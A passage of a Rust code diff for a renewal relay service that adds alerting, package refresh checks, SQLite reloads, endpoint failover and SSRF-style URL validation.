+    let retryable_failed_slots = stored
+        .results
+        .values()
+        .filter(|entry| {
+            matches!(entry.result.status, RelaySlotStatus::Failed) && entry.attempts < max_attempts
+        })
+        .count();
+    let missed_slots = count_status(stored, RelaySlotStatus::Missed);
+    let awaiting_settlement_slots = count_status(stored, RelaySlotStatus::AwaitingSettlement);
+    let awaiting_wallet_refresh_slots =
+        count_status(stored, RelaySlotStatus::AwaitingWalletRefresh);
+    let unobserved_epochs = stored
+        .package
+        .slots
+        .iter()
+        .filter(|slot| !stored.results.contains_key(&slot.slot_id))
+        .map(|slot| slot.epoch_id)
+        .collect::<Vec<_>>();
+    let unobserved_slots = stored
+        .package
+        .slot_count
+        .saturating_sub(stored.results.len());
+    let fallback_unobserved_epoch = if unobserved_slots > 0 && unobserved_epochs.is_empty() {
+        last_observed_epoch.map(|epoch| epoch.saturating_add(1))
+    } else {
+        None
+    };
+    RelayOpsPackageSummary {
+        package_id: stored.package.package_id.clone(),
+        package_commitment: stored.package.package_commitment.clone(),
+        pair: stored.package.pair.clone(),
+        relay_mode: relay_mode_log_label(stored.package.relay_mode.as_ref()).into(),
+        start_epoch: stored.package.start_epoch,
+        end_epoch: stored.package.end_epoch,
+        slot_count: stored.package.slot_count,
+        result_count: stored.results.len(),
+        unobserved_slots,
+        submitted_slots,
+        failed_slots,
+        retryable_failed_slots,
+        missed_slots,
+        awaiting_settlement_slots,
+        awaiting_wallet_refresh_slots,
+        oldest_unobserved_epoch: unobserved_epochs
+            .iter()
+            .copied()
+            .min()
+            .or(fallback_unobserved_epoch),
+        newest_unobserved_epoch: unobserved_epochs
+            .iter()
+            .copied()
+            .max()
+            .or(fallback_unobserved_epoch),
+        last_attempt_unix_ms: stored
+            .results
+            .values()
+            .map(|entry| entry.last_attempt_unix_ms)
+            .max(),
+        updated_at_unix_ms: stored.updated_at_unix_ms,
+    }
+}
+
+fn count_status(stored: &StoredPackage, status: RelaySlotStatus) -> usize {
+    stored
+        .results
+        .values()
+        .filter(|entry| entry.result.status == status)
+        .count()
+}
+
+fn extend_ops_alerts_for_package(
+    alerts: &mut Vec<RelayOpsAlert>,
+    package: &RelayOpsPackageSummary,
+    expiry_warning_epochs: u64,
+    last_observed_epoch: Option<u64>,
+) {
+    let package_id = Some(package.package_id.clone());
+    if package.missed_slots > 0 {
+        alerts.push(RelayOpsAlert {
+            severity: "critical".into(),
+            code: "missed_slots".into(),
+            package_id: package_id.clone(),
+            detail: format!(
+                "{} renewal slots missed their authorized epoch window.",
+                package.missed_slots
+            ),
+        });
+    }
+    if package.failed_slots > 0 {
+        alerts.push(RelayOpsAlert {
+            severity: "warning".into(),
+            code: "failed_slots".into(),
+            package_id: package_id.clone(),
+            detail: format!("{} renewal slots failed submission.", package.failed_slots),
+        });
+    }
+    if package.awaiting_wallet_refresh_slots > 0 {
+        alerts.push(RelayOpsAlert {
+            severity: "warning".into(),
+            code: "wallet_refresh_required".into(),
+            package_id: package_id.clone(),
+            detail: "A prior child used reusable maker capital; refresh the package from the wallet before continuing.".into(),
+        });
+    }
+    if let Some(observed_epoch) = last_observed_epoch {
+        if package.unobserved_slots > 0 && package.end_epoch <= observed_epoch {
+            alerts.push(RelayOpsAlert {
+                severity: "critical".into(),
+                code: "package_window_passed".into(),
+                package_id: package_id.clone(),
+                detail: format!(
+                    "Package ended at epoch {}, but {} slots remain without results.",
+                    package.end_epoch, package.unobserved_slots
+                ),
+            });
+        } else if package.unobserved_slots > 0
+            && package.end_epoch <= observed_epoch.saturating_add(expiry_warning_epochs)
+        {
+            alerts.push(RelayOpsAlert {
+                severity: "warning".into(),
+                code: "package_expires_soon".into(),
+                package_id,
+                detail: format!(
+                    "Package ends at epoch {}; refresh before expiry to avoid missed maker slots.",
+                    package.end_epoch
+                ),
+            });
+        }
+    }
 }
 
 async fn register_package(
@@ -625,6 +1142,8 @@ async fn register_package(
     }
     let now = now_unix_ms();
     let package_id = package.package_id.clone();
+    let package_for_storage = package_for_storage(&package);
+    refresh_sqlite_store_if_needed(&state).await?;
     let status = {
         let mut store = state.store.write().await;
         prune_store_locked(&mut store, &state.config, now);
@@ -648,6 +1167,7 @@ async fn register_package(
                 log_package_api_error("conflict", &package, &error);
                 return Err(error);
             }
+            validate_package_refresh(existing, &package)?;
             let retained_slot_ids = package
                 .slots
                 .iter()
@@ -661,12 +1181,12 @@ async fn register_package(
             .packages
             .entry(package_id.clone())
             .or_insert_with(|| StoredPackage {
-                package: package.clone(),
+                package: package_for_storage.clone(),
                 registered_at_unix_ms: now,
                 updated_at_unix_ms: now,
                 results: BTreeMap::new(),
             });
-        entry.package = package;
+        entry.package = package_for_storage;
         entry.updated_at_unix_ms = now;
         package_status(entry)
     };
@@ -675,33 +1195,71 @@ async fn register_package(
     Ok(Json(status))
 }
 
+fn package_for_storage(package: &OfflineRenewalPackage) -> OfflineRenewalPackage {
+    let mut stored = package.clone();
+    stored.relay_authorization = None;
+    stored
+}
+
+fn validate_package_refresh(
+    existing: &StoredPackage,
+    package: &OfflineRenewalPackage,
+) -> Result<(), RelayApiError> {
+    let current = &existing.package;
+    if package.created_at_unix_ms < current.created_at_unix_ms {
+        return Err(RelayApiError {
+            status: StatusCode::CONFLICT,
+            detail: "Renewal package refresh is older than the registered package".into(),
+        });
+    }
+    if package.end_epoch < current.end_epoch {
+        return Err(RelayApiError {
+            status: StatusCode::CONFLICT,
+            detail: "Renewal package refresh cannot shrink the active renewal window".into(),
+        });
+    }
+    if package.created_at_unix_ms <= current.created_at_unix_ms
+        && package.end_epoch <= current.end_epoch
+    {
+        return Err(RelayApiError {
+            status: StatusCode::CONFLICT,
+            detail: "Renewal package refresh must advance creation time or renewal window".into(),
+        });
+    }
+    Ok(())
+}
+
 async fn get_package_status(
     State(state): State<AppState>,
+    PeerAddress(peer): PeerAddress,
     headers: HeaderMap,
     Path(package_id): Path<String>,
 ) -> Result<Json<PackageStatus>, RelayApiError> {
+    refresh_sqlite_store_if_needed(&state).await?;
     let store = state.store.read().await;
     let package = store
         .packages
         .get(&package_id)
-        .ok_or(RelayApiError::status(StatusCode::NOT_FOUND))?;
-    require_package_request_auth(&state, &headers, &package.package)?;
-    enforce_rate_limit(&state, &headers).await?;
+        .ok_or(RelayApiError::status(StatusCode::UNAUTHORIZED))?;
+    require_package_access_auth(&state, &headers, &package.package)?;
+    enforce_rate_limit(&state, &headers, peer).await?;
     Ok(Json(package_status(package)))
 }
 
 async fn get_package_results(
     State(state): State<AppState>,
+    PeerAddress(peer): PeerAddress,
     headers: HeaderMap,
     Path(package_id): Path<String>,
 ) -> Result<Json<PackageResults>, RelayApiError> {
+    refresh_sqlite_store_if_needed(&state).await?;
     let store = state.store.read().await;
     let package = store
         .packages
         .get(&package_id)
-        .ok_or(RelayApiError::status(StatusCode::NOT_FOUND))?;
-    require_package_request_auth(&state, &headers, &package.package)?;
-    enforce_rate_limit(&state, &headers).await?;
+        .ok_or(RelayApiError::status(StatusCode::UNAUTHORIZED))?;
+    require_package_access_auth(&state, &headers, &package.package)?;
+    enforce_rate_limit(&state, &headers, peer).await?;
     Ok(Json(PackageResults {
         package_id: package.package.package_id.clone(),
         package_commitment: package.package.package_commitment.clone(),
@@ -713,18 +1271,64 @@ async fn get_package_results(
     }))
 }
 
-async fn get_package_results_csv(
+async fn attest_package_order(
     State(state): State<AppState>,
+    PeerAddress(peer): PeerAddress,
     headers: HeaderMap,
     Path(package_id): Path<String>,
-) -> Result<impl IntoResponse, RelayApiError> {
+    Json(request): Json<PackageOrderAttestationRequest>,
+) -> Result<Json<PackageOrderAttestation>, RelayApiError> {
+    refresh_sqlite_store_if_needed(&state).await?;
     let store = state.store.read().await;
     let package = store
         .packages
         .get(&package_id)
+        .ok_or(RelayApiError::status(StatusCode::UNAUTHORIZED))?;
+    require_package_access_auth(&state, &headers, &package.package)?;
+    enforce_rate_limit(&state, &headers, peer).await?;
+    if package.package.package_commitment != request.package_commitment {
+        return Err(RelayApiError::status(StatusCode::CONFLICT));
+    }
+    let slot = package
+        .package
+        .slots
+        .iter()
+        .find(|slot| {
+            slot.order_commitment == request.order_commitment
+                && slot.pair == request.pair
+                && slot.batch_id == request.batch_id
+                && slot.epoch_id == request.epoch_id
+        })
         .ok_or(RelayApiError::status(StatusCode::NOT_FOUND))?;
-    require_package_request_auth(&state, &headers, &package.package)?;
-    enforce_rate_limit(&state, &headers).await?;
+    Ok(Json(PackageOrderAttestation {
+        package_id: package.package.package_id.clone(),
+        package_commitment: package.package.package_commitment.clone(),
+        order_commitment: slot.order_commitment.clone(),
+        pair: slot.pair.clone(),
+        batch_id: slot.batch_id.clone(),
+        epoch_id: slot.epoch_id,
+        relay_mode: package
+            .package
+            .relay_mode
+            .clone()
+            .unwrap_or(RelayMode::ZylithRelay),
+    }))
+}
+
+async fn get_package_results_csv(
+    State(state): State<AppState>,
+    PeerAddress(peer): PeerAddress,
+    headers: HeaderMap,
+    Path(package_id): Path<String>,
+) -> Result<impl IntoResponse, RelayApiError> {
+    refresh_sqlite_store_if_needed(&state).await?;
+    let store = state.store.read().await;
+    let package = store
+        .packages
+        .get(&package_id)
+        .ok_or(RelayApiError::status(StatusCode::UNAUTHORIZED))?;
+    require_package_access_auth(&state, &headers, &package.package)?;
+    enforce_rate_limit(&state, &headers, peer).await?;
 
     let mut csv = String::from(
         "package_id,pair,slot_id,parent_child_index,batch_id,epoch_id,order_commitment,status,detail,accepted_order_commitment,accepted_batch_id,accepted_at_unix_ms\n",
@@ -842,19 +1446,21 @@ fn relay_mode_log_label(mode: Option<&RelayMode>) -> &'static str {
 
 async fn delete_package(
     State(state): State<AppState>,
+    PeerAddress(peer): PeerAddress,
     headers: HeaderMap,
     Path(package_id): Path<String>,
 ) -> Result<StatusCode, RelayApiError> {
+    refresh_sqlite_store_if_needed(&state).await?;
     let package = {
         let store = state.store.read().await;
         store
             .packages
             .get(&package_id)
             .cloned()
-            .ok_or(RelayApiError::status(StatusCode::NOT_FOUND))?
+            .ok_or(RelayApiError::status(StatusCode::UNAUTHORIZED))?
     };
-    require_package_request_auth(&state, &headers, &package.package)?;
-    enforce_rate_limit(&state, &headers).await?;
+    require_package_access_auth(&state, &headers, &package.package)?;
+    enforce_rate_limit(&state, &headers, peer).await?;
     let removed = {
         let mut store = state.store.write().await;
         let Some(current) = store.packages.get(&package_id) else {
@@ -874,7 +1480,11 @@ async fn delete_package(
         }
         removed
     };
-    if removed {
+    if removed && is_sqlite_store(&state.config.store_path) {
+        persist_sqlite_package_tombstone(&state.config.store_path, &package_id, now_unix_ms())
+            .await
+            .map_err(RelayApiError::internal)?;
+    } else if removed {
         persist_store(&state.config.store_path, &state.store).await?;
     }
     Ok(StatusCode::NO_CONTENT)
@@ -886,6 +1496,7 @@ async fn trigger_tick(
 ) -> Result<Json<Vec<OfflineRenewalRelayResult>>, RelayApiError> {
     require_internal_auth(&state, &headers)?;
     let results = process_due_slots_once(&state).await;
+    dispatch_ops_alerts(&state).await;
     Ok(Json(results))
 }
 
@@ -909,6 +1520,7 @@ fn spawn_worker(state: AppState) {
                     );
                 }
             }
+            dispatch_ops_alerts(&state).await;
         }
     });
 }
@@ -920,6 +1532,13 @@ async fn process_due_slots_once(state: &AppState) -> Vec<OfflineRenewalRelayResu
         return Vec::new();
     }
     let sqlite_store = is_sqlite_store(&state.config.store_path);
+    if sqlite_store && let Err(error) = refresh_sqlite_store_if_needed(state).await {
+        eprintln!("renewal relay failed to refresh sqlite store before tick: {error:?}");
+        if let PersistentTickLease::Acquired(owner) = persistent_lease {
+            release_persistent_tick_lease(&state.config.store_path, &owner).await;
+        }
+        return Vec::new();
+    }
     let snapshots = {
         let mut store = state.store.write().await;
         prune_store_locked(&mut store, &state.config, now_unix_ms());
@@ -979,6 +1598,18 @@ async fn process_due_slots_once(state: &AppState) -> Vec<OfflineRenewalRelayResu
         release_persistent_tick_lease(&state.config.store_path, &owner).await;
     }
     emitted
+}
+
+async fn refresh_sqlite_store_if_needed(state: &AppState) -> Result<(), RelayApiError> {
+    if !is_sqlite_store(&state.config.store_path) {
+        return Ok(());
+    }
+    let loaded = load_sqlite_store(&state.config.store_path)
+        .await
+        .map_err(RelayApiError::internal)?;
+    let mut store = state.store.write().await;
+    *store = loaded;
+    Ok(())
 }
 
 async fn due_slots_for_package_tick(
@@ -1071,6 +1702,26 @@ async fn process_slot_against_batch(
             Some(format!("scheduled at {scheduled_at}")),
         );
     }
+    match parent_cancel_marker_recorded(state, package).await {
+        Ok(true) => {
+            tombstone_package(state, &package.package_id).await;
+            return slot_result(
+                slot,
+                RelaySlotStatus::Missed,
+                Some("Renewal parent cancellation marker is recorded on-chain".into()),
+            );
+        }
+        Ok(false) => {}
+        Err(error) => {
+            return slot_result(
+                slot,
+                RelaySlotStatus::AwaitingSettlement,
+                Some(format!(
+                    "Unable to verify parent cancellation status: {error}"
+                )),
+            );
+        }
+    }
     if let Some(guarded) = prior_slot_reuse_guard(state, package, slot).await {
         return guarded;
     }
@@ -1118,32 +1769,37 @@ async fn prior_slot_reuse_guard(
         match fetch_proof_job_status(state, package, &prior.batch_id).await {
             Ok(Some(status)) => {
                 if proof_job_failed(&status) {
-                    continue;
+                    return Some(slot_result(
+                        slot,
+                        RelaySlotStatus::AwaitingSettlement,
+                        Some(format!(
+                            "Prior child batch {} proof failed; waiting for wallet refresh before reusing maker capital",
+                            prior.batch_id
+                        )),
+                    ));
                 }
                 if proof_job_confirmed(&status) {
-                    match status.matched_order_count {
-                        Some(0) => continue,
-                        Some(_) => {
-                            return Some(slot_result(
-                                slot,
-                                RelaySlotStatus::AwaitingWalletRefresh,
-                                Some(format!(
-                                    "Prior child batch {} settled with matched orders; refresh the package from the wallet before reusing maker capital",
-                                    prior.batch_id
-                                )),
-                            ));
-                        }
-                        None => {
-                            return Some(slot_result(
-                                slot,
-                                RelaySlotStatus::AwaitingSettlement,
-                                Some(format!(
-                                    "Prior child batch {} is confirmed but exact match count is unavailable; waiting before reusing maker capital",
-                                    prior.batch_id
-                                )),
-                            ));
-                        }
+                    if status.reuse_state.as_deref() == Some("no_fill") {
+                        continue;
                     }
+                    if status.reuse_state.as_deref() == Some("matched") {
+                        return Some(slot_result(
+                            slot,
+                            RelaySlotStatus::AwaitingWalletRefresh,
+                            Some(format!(
+                                "Prior child batch {} settled with matched orders; refresh the package from the wallet before reusing maker capital",
+                                prior.batch_id
+                            )),
+                        ));
+                    }
+                    return Some(slot_result(
+                        slot,
+                        RelaySlotStatus::AwaitingSettlement,
+                        Some(format!(
+                            "Prior child batch {} is confirmed but no no-fill reuse attestation is available; waiting before reusing maker capital",
+                            prior.batch_id
+                        )),
+                    ));
                 }
                 return Some(slot_result(
                     slot,
@@ -1167,6 +1823,51 @@ async fn prior_slot_reuse_guard(
         }
     }
     None
+}
+
+#[derive(Clone, Debug, Deserialize)]
+struct RenewalCancelMarkerStatus {
+    recorded: bool,
+}
+
+async fn parent_cancel_marker_recorded(
+    state: &AppState,
+    package: &OfflineRenewalPackage,
+) -> Result<bool, String> {
+    let Some(marker) = package
+        .parent_cancel_marker
+        .as_deref()
+        .map(str::trim)
+        .filter(|value| !value.is_empty())
+    else {
+        return Ok(false);
+    };
+    let coordinator_urls = package_coordinator_urls(&state.config, package)?;
+    let path = format!("/api/renewal/cancel-markers/{marker}");
+    let status: RenewalCancelMarkerStatus =
+        get_json_with_auth_failover(&state.http, &coordinator_urls, &path, None).await?;
+    Ok(status.recorded)
+}
+
+async fn tombstone_package(state: &AppState, package_id: &str) {
+    let cancelled_at_unix_ms = now_unix_ms();
+    {
+        let mut store = state.store.write().await;
+        store.packages.remove(package_id);
+        store
+            .cancelled_packages
+            .insert(package_id.to_owned(), cancelled_at_unix_ms);
+    }
+    if is_sqlite_store(&state.config.store_path) {
+        let _ = persist_sqlite_package_tombstone(
+            &state.config.store_path,
+            package_id,
+            cancelled_at_unix_ms,
+        )
+        .await;
+    } else {
+        let _ = persist_store(&state.config.store_path, &state.store).await;
+    }
 }
 
 async fn prior_submitted_reused_funding_slots(
@@ -1225,10 +1926,10 @@ async fn fetch_proof_job_status(
     package: &OfflineRenewalPackage,
     batch_id: &str,
 ) -> Result<Option<PublicProofJobStatus>, String> {
-    let prover_url = package_prover_url(&state.config, package)?;
+    let prover_urls = package_prover_urls(&state.config, package)?;
     let internal_token = state
         .config
-        .internal_control_token
+        .prover_control_token
         .as_ref()
         .map(|token| token.as_str());
     let path = if internal_token.is_some() {
@@ -1236,9 +1937,9 @@ async fn fetch_proof_job_status(
     } else {
         format!("/api/public/proof-jobs/{batch_id}")
     };
-    match get_json_with_auth::<PublicProofJobStatus>(
+    match get_json_with_auth_failover::<PublicProofJobStatus>(
         &state.http,
-        &prover_url,
+        &prover_urls,
         &path,
         internal_token,
     )
@@ -1263,8 +1964,8 @@ async fn submit_slot(
     package: &OfflineRenewalPackage,
     slot: &OfflineRenewalSlot,
 ) -> Result<CoordinatorAccepted, String> {
-    let prover_url = package_prover_url(&state.config, package)?;
-    let coordinator_url = package_coordinator_url(&state.config, package)?;
+    let prover_urls = package_prover_urls(&state.config, package)?;
+    let coordinator_urls = package_coordinator_urls(&state.config, package)?;
     let mut ingress_request = slot.ingress_request.clone();
     let Some(object) = ingress_request.as_object_mut() else {
         return Err("slot ingress request must be a JSON object".into());
@@ -1282,23 +1983,36 @@ async fn submit_slot(
         serde_json::to_value(package.relay_mode.as_ref())
             .map_err(|error| format!("serialize relay mode: {error}"))?,
     );
-    let ingress: IngressResponse = post_json(
+    object.insert(
+        "renewal_slot_order_commitment".into(),
+        Value::String(slot.order_commitment.clone()),
+    );
+    object.insert("renewal_slot_pair".into(), Value::String(slot.pair.clone()));
+    object.insert(
+        "renewal_slot_batch_id".into(),
+        Value::String(slot.batch_id.clone()),
+    );
+    object.insert(
+        "renewal_slot_epoch_id".into(),
+        Value::Number(serde_json::Number::from(slot.epoch_id)),
+    );
+    let ingress: IngressResponse = post_json_failover(
         &state.http,
-        &prover_url,
+        &prover_urls,
         "/api/private/orders",
         &ingress_request,
         None,
     )
     .await?;
-    validate_ingress_receipt_for_package(package, &ingress.receipt)?;
+    validate_ingress_receipt_for_slot(package, slot, &ingress.receipt)?;
     let order_path = if state.config.coordinator_control_token.is_some() {
         "/api/maker/orders"
     } else {
         "/api/orders"
     };
-    post_json(
+    let accepted: CoordinatorAccepted = post_json_failover(
         &state.http,
-        &coordinator_url,
+        &coordinator_urls,
         order_path,
         &ingress.coordinator_submission,
         state
@@ -1307,13 +2021,28 @@ async fn submit_slot(
             .as_deref()
             .map(String::as_str),
     )
-    .await
+    .await?;
+    validate_coordinator_accepted_for_slot(slot, &accepted)?;
+    Ok(accepted)
 }
 
-fn validate_ingress_receipt_for_package(
+fn validate_ingress_receipt_for_slot(
     package: &OfflineRenewalPackage,
+    slot: &OfflineRenewalSlot,
     receipt: &IngressReceipt,
 ) -> Result<(), String> {
+    if receipt.order_commitment != slot.order_commitment {
+        return Err("private ingress receipt order commitment mismatch".into());
+    }
+    if receipt.pair_id != slot.pair {
+        return Err("private ingress receipt pair mismatch".into());
+    }
+    if receipt.batch_id != slot.batch_id {
+        return Err("private ingress receipt batch mismatch".into());
+    }
+    if receipt.epoch_id != slot.epoch_id {
+        return Err("private ingress receipt epoch mismatch".into());
+    }
     let Some(expected_relay_mode) = package.relay_mode.as_ref() else {
         return Err("package relay mode missing".into());
     };
@@ -1329,18 +2058,31 @@ fn validate_ingress_receipt_for_package(
     Ok(())
 }
 
+fn validate_coordinator_accepted_for_slot(
+    slot: &OfflineRenewalSlot,
+    accepted: &CoordinatorAccepted,
+) -> Result<(), String> {
+    if accepted.order_commitment != slot.order_commitment {
+        return Err("coordinator accepted order commitment mismatch".into());
+    }
+    if accepted.batch_id != slot.batch_id {
+        return Err("coordinator accepted batch mismatch".into());
+    }
+    Ok(())
+}
+
 async fn fetch_current_batch(
     state: &AppState,
     package: &OfflineRenewalPackage,
     pair: &str,
 ) -> Result<PublicBatchSummary, String> {
-    let coordinator_url = package_coordinator_url(&state.config, package)?;
+    let coordinator_urls = package_coordinator_urls(&state.config, package)?;
     let (base, quote) = pair
         .split_once('/')
         .ok_or_else(|| format!("invalid pair {pair}"))?;
-    get_json(
+    get_json_failover(
         &state.http,
-        &coordinator_url,
+        &coordinator_urls,
         &format!("/api/pairs/{base}/{quote}/batches/current"),
     )
     .await
@@ -1409,6 +2151,29 @@ async fn post_json<T: for<'de> Deserialize<'de>>(
         .map_err(|error| format!("invalid JSON response: {error}"))
 }
 
+async fn post_json_failover<T: for<'de> Deserialize<'de>>(
+    http: &Client,
+    base_urls: &[String],
+    path: &str,
+    body: &Value,
+    bearer_token: Option<&str>,
+) -> Result<T, String> {
+    let mut last_error = None;
+    for (index, base_url) in base_urls.iter().enumerate() {
+        match post_json(http, base_url, path, body, bearer_token).await {
+            Ok(response) => return Ok(response),
+            Err(error) => {
+                let retryable = is_failover_retryable_error(&error);
+                last_error = Some(format!("{}{}: {error}", base_url, path));
+                if !retryable || index + 1 == base_urls.len() {
+                    break;
+                }
+            }
+        }
+    }
+    Err(last_error.unwrap_or_else(|| format!("no endpoints configured for {path}")))
+}
+
 async fn get_json<T: for<'de> Deserialize<'de>>(
     http: &Client,
     base_url: &str,
@@ -1429,6 +2194,27 @@ async fn get_json<T: for<'de> Deserialize<'de>>(
         .json::<T>()
         .await
         .map_err(|error| format!("invalid JSON response: {error}"))
+}
+
+async fn get_json_failover<T: for<'de> Deserialize<'de>>(
+    http: &Client,
+    base_urls: &[String],
+    path: &str,
+) -> Result<T, String> {
+    let mut last_error = None;
+    for (index, base_url) in base_urls.iter().enumerate() {
+        match get_json(http, base_url, path).await {
+            Ok(response) => return Ok(response),
+            Err(error) => {
+                let retryable = is_failover_retryable_error(&error);
+                last_error = Some(format!("{}{}: {error}", base_url, path));
+                if !retryable || index + 1 == base_urls.len() {
+                    break;
+                }
+            }
+        }
+    }
+    Err(last_error.unwrap_or_else(|| format!("no endpoints configured for {path}")))
 }
 
 async fn get_json_with_auth<T: for<'de> Deserialize<'de>>(
@@ -1458,6 +2244,62 @@ async fn get_json_with_auth<T: for<'de> Deserialize<'de>>(
         .map_err(|error| format!("invalid JSON response: {error}"))
 }
 
+async fn get_json_with_auth_failover<T: for<'de> Deserialize<'de>>(
+    http: &Client,
+    base_urls: &[String],
+    path: &str,
+    bearer_token: Option<&str>,
+) -> Result<T, String> {
+    let mut last_error = None;
+    for (index, base_url) in base_urls.iter().enumerate() {
+        match get_json_with_auth(http, base_url, path, bearer_token).await {
+            Ok(response) => return Ok(response),
+            Err(error) => {
+                let retryable = is_failover_retryable_error(&error);
+                last_error = Some(format!("{}{}: {error}", base_url, path));
+                if !retryable || index + 1 == base_urls.len() {
+                    break;
+                }
+            }
+        }
+    }
+    Err(last_error.unwrap_or_else(|| format!("no endpoints configured for {path}")))
+}
+
+async fn post_alert_webhook(
+    http: &Client,
+    webhook_url: &str,
+    body: &Value,
+    bearer_token: Option<&str>,
+) -> Result<(), String> {
+    let mut request = http
+        .post(webhook_url)
+        .header("accept", "application/json")
+        .header("content-type", "application/json")
+        .json(body);
+    if let Some(token) = bearer_token {
+        request = request.header(AUTHORIZATION.as_str(), format_bearer_token(token));
+    }
+    let response = request
+        .send()
+        .await
+        .map_err(|error| format!("request failed: {error}"))?;
+    if !response.status().is_success() {
+        let status = response.status();
+        let detail = response.text().await.unwrap_or_default();
+        return Err(format!("HTTP {status}: {detail}"));
+    }
+    Ok(())
+}
+
+fn is_failover_retryable_error(error: &str) -> bool {
+    error.starts_with("request failed")
+        || error.starts_with("invalid JSON response")
+        || error.starts_with("HTTP 5")
+        || error.starts_with("HTTP 408")
+        || error.starts_with("HTTP 429")
+}
+
 fn validate_package(
     package: &OfflineRenewalPackage,
     config: &RelayConfig,
@@ -1482,6 +2324,23 @@ fn validate_package(
     if package.package_id.trim().is_empty() || package.package_commitment.trim().is_empty() {
         return Err(RelayApiError::bad_request(
             "Renewal package identity is missing",
+        ));
+    }
+    if package
+        .parent_cancel_authority
+        .as_deref()
+        .map(str::trim)
+        .filter(|value| !value.is_empty())
+        .is_none()
+        || package
+            .parent_cancel_marker
+            .as_deref()
+            .map(str::trim)
+            .filter(|value| !value.is_empty())
+            .is_none()
+    {
+        return Err(RelayApiError::bad_request(
+            "Renewal package cancellation marker is missing",
         ));
     }
     let expected_commitment = renewal_package_commitment(package)
@@ -1522,8 +2381,8 @@ fn validate_package(
             "Renewal package slots must be sorted by epoch",
         ));
     }
-    if package_prover_url(config, package).is_err()
-        || package_coordinator_url(config, package).is_err()
+    if package_prover_urls(config, package).is_err()
+        || package_coordinator_urls(config, package).is_err()
     {
         return Err(RelayApiError::bad_request(
             "Renewal package requires coordinator and prover URLs",
@@ -1593,7 +2452,7 @@ fn stable_json_string(value: &Value) -> Result<String, String> {
         }
         Value::Object(values) => {
             let mut sorted = values.iter().collect::<Vec<_>>();
-            sorted.sort_by(|(left, _), (right, _)| left.cmp(right));
+            sorted.sort_by_key(|(key, _)| *key);
             let mut out = String::from("{");
             for (index, (key, entry)) in sorted.into_iter().enumerate() {
                 if index > 0 {
@@ -1719,6 +2578,9 @@ fn effective_submission_safety_buffer_ms(package: &OfflineRenewalPackage) -> u64
 
 fn effective_max_submission_delay_ms(package: &OfflineRenewalPackage) -> u64 {
     if package.relay_mode == Some(RelayMode::ZylithRelay) {
+        if package.relay_policy.max_submission_delay_ms == 0 {
+            return 0;
+        }
         package.relay_policy.max_submission_delay_ms.clamp(
             MIN_MANAGED_SUBMISSION_DELAY_MS,
             MAX_MANAGED_SUBMISSION_DELAY_MS,
@@ -1728,26 +2590,112 @@ fn effective_max_submission_delay_ms(package: &OfflineRenewalPackage) -> u64 {
     }
 }
 
-fn package_prover_url(
+fn configured_coordinator_urls(config: &RelayConfig) -> Vec<String> {
+    let mut urls = Vec::new();
+    if let Some(url) = config.default_coordinator_url.as_ref() {
+        urls.push(url.clone());
+    }
+    urls.extend(config.default_coordinator_failover_urls.clone());
+    dedup_urls(urls)
+}
+
+fn configured_prover_urls(config: &RelayConfig) -> Vec<String> {
+    let mut urls = Vec::new();
+    if let Some(url) = config.default_prover_url.as_ref() {
+        urls.push(url.clone());
+    }
+    urls.extend(config.default_prover_failover_urls.clone());
+    dedup_urls(urls)
+}
+
+fn package_prover_urls(
     config: &RelayConfig,
     package: &OfflineRenewalPackage,
-) -> Result<String, String> {
-    config
-        .default_prover_url
-        .clone()
-        .or_else(|| package_prover_url_from_policy(package))
+) -> Result<Vec<String>, String> {
+    let urls = configured_prover_urls(config);
+    if !urls.is_empty() {
+        return validate_service_urls(urls, false);
+    }
+    if package_policy_urls_disabled(config) {
+        return Err("pinned prover URL is required for exposed or worker-enabled relays".into());
+    }
+    package_prover_url_from_policy(package)
+        .map(|url| validate_service_urls(vec![url], package_policy_urls_disabled(config)))
+        .transpose()?
         .ok_or_else(|| "private ingress URL missing".into())
 }
 
-fn package_coordinator_url(
+fn package_coordinator_urls(
     config: &RelayConfig,
     package: &OfflineRenewalPackage,
-) -> Result<String, String> {
-    config
-        .default_coordinator_url
-        .clone()
-        .or_else(|| package_coordinator_url_from_policy(package))
+) -> Result<Vec<String>, String> {
+    let urls = configured_coordinator_urls(config);
+    if !urls.is_empty() {
+        return validate_service_urls(urls, false);
+    }
+    if package_policy_urls_disabled(config) {
+        return Err(
+            "pinned coordinator URL is required for exposed or worker-enabled relays".into(),
+        );
+    }
+    package_coordinator_url_from_policy(package)
+        .map(|url| validate_service_urls(vec![url], package_policy_urls_disabled(config)))
+        .transpose()?
         .ok_or_else(|| "coordinator URL missing".into())
+}
+
+fn package_policy_urls_disabled(config: &RelayConfig) -> bool {
+    config.strict_mode || config.enable_worker || !config.bind_addr.ip().is_loopback()
+}
+
+fn validate_service_urls(
+    urls: Vec<String>,
+    reject_restricted_hosts: bool,
+) -> Result<Vec<String>, String> {
+    urls.into_iter()
+        .map(|url| validate_service_url(url, reject_restricted_hosts))
+        .collect()
+}
+
+fn validate_service_url(url: String, reject_restricted_hosts: bool) -> Result<String, String> {
+    let parsed =
+        url::Url::parse(&url).map_err(|error| format!("invalid relay service URL: {error}"))?;
+    match parsed.scheme() {
+        "http" | "https" => {}
+        _ => return Err("relay service URL must use http or https".into()),
+    }
+    if reject_restricted_hosts {
+        let Some(host) = parsed.host_str() else {
+            return Err("relay service URL host is missing".into());
+        };
+        if let Ok(ip) = host.parse::<IpAddr>()
+            && is_restricted_outbound_ip(ip)
+        {
+            return Err("relay service URL points at a private or link-local address".into());
+        }
+    }
+    Ok(url)
+}
+
+fn is_restricted_outbound_ip(ip: IpAddr) -> bool {
+    match ip {
+        IpAddr::V4(ip) => {
+            ip.is_private()
+                || ip.is_loopback()
+                || ip.is_link_local()
+                || ip.is_broadcast()
+                || ip.is_documentation()
+                || ip.octets()[0] == 0
+                || ip.octets()[0] >= 224
+        }
+        IpAddr::V6(ip) => {
+            ip.is_loopback()
+                || ip.is_unspecified()
+                || ip.is_unique_local()
+                || ip.is_unicast_link_local()
+                || ip.segments()[0] & 0xffc0 == 0xffc0
+        }
+    }
 }
 
 fn package_prover_url_from_policy(package: &OfflineRenewalPackage) -> Option<String> {
@@ -1789,54 +2737,64 @@ fn require_package_registration_auth(
     Ok(())
 }
 
-fn require_package_request_auth(
+fn require_package_access_auth(
     state: &AppState,
     headers: &HeaderMap,
     package: &OfflineRenewalPackage,
 ) -> Result<(), RelayApiError> {
-    let expected_bearer = state
-        .config
-        .package_registration_token
-        .as_deref()
-        .map(String::as_str);
-    if let Some(expected) = expected_bearer {
-        match bearer_auth_status(expected, headers) {
-            BearerAuthStatus::Valid => return Ok(()),
-            BearerAuthStatus::Invalid => {
